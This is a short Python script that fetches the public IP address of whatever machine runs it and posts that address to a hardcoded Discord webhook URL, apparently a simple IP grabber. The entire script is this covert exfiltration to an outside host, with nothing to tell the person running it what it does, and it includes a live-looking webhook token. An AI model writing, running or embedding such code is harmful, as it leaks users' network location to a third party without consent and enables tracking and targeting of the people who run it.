import requests
webhook = 'https://discord.com/api/webhooks/1532375170495287326/vmO6PpO5oYtmZIqgT3z7UxMEBZCLADs2N86SI1GS32ZJvaPFDFxjnxu3qVy85tH7L1sy'
url = 'https://www.ipinfo.im/ip/'
response = requests.get(url)
ip = response.text.strip()
requests.post(webhook, json={'content': ip})